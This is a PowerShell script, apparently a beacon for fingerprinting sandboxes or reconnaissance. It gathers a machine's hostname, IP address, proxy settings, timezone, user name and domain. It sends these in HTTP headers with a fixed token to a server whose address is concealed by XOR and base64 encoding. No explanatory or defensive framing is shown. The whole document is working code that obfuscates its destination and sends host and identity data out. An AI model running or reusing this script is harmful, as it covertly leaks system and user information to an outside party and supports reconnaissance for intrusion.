# Sandbox 
$sandbox = "Zscaler_Sandbox"

# Gather local information
$hostname = $env:COMPUTERNAME
$localIp = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq "IPv4" -and $_.IPAddress -ne "127.0.0.1" }).IPAddress
$proxyConfig = (Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Internet Settings").ProxyServer
if (-not $proxyConfig) { $proxyConfig = "no proxy" }
$localTime = Get-Date -Format "yyyy-MM-ddTHH:mm:ss"
$timezone = (Get-TimeZone).Id
$localUser = $env:USERNAME
$domainName = $env:USERDOMAIN

# Build JSON configuration
$machineConfig = @{
    HostName           = $hostname
    LocalIPAddress     = $localIp
    ProxyConfiguration = $proxyConfig
    LocalTime          = $localTime
    TimeZone           = $timezone
    LocalUser          = $localUser
    DomainName         = $domainName
} | ConvertTo-Json -Depth 2 -Compress

# Set up HTTP request
$headers = @{
    machine_config = $machineConfig
    Token = "kaszanka"
    Sandbox = $sandbox
}

function st_magic {
    param (
        [string]$input_str,
        [string]$key,
        [string]$action
    )

    $processedInput = $input_str

    # Decode from base64 if the action is 'decrypt'
    if ($action -eq "decrypt") {
        $processedInput = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($processedInput))
    }

    $result = ""

    # Apply XOR logic
    for ($i = 0; $i -lt $processedInput.Length; $i++) {
        $result += [char]($processedInput[$i] -bxor $key[$i % $key.Length])
    }

    # Encode to base64 if the action is 'encrypt'
    if ($action -eq "encrypt") {
        $result = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($result))
    }

    return $result
}

# Get the URL
$uri = st_magic -input 'AxUHCltBRFBYU11LVVZFVlhPQUlYVFNR' -key 'kaszanka' -action 'decrypt'

# Make the HTTP request
try {
    $response = Invoke-RestMethod -Uri $uri -Headers $headers -Method Get
    Write-Host "Request sent successfully. Response:"
    Write-Host $response
} catch {
    Write-Host "Error during request: $($_.Exception.Message)"
}

Start-Sleep -Seconds 30
